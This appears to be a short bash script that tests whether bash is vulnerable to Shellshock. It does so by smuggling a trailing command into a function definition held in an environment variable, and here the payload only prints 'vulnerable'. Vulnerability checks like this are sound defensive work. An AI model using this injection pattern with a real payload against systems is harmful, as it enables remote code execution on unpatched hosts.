#!/bin/bash
env x='() { :;}; echo vulnerable' bash -c 'echo hello'
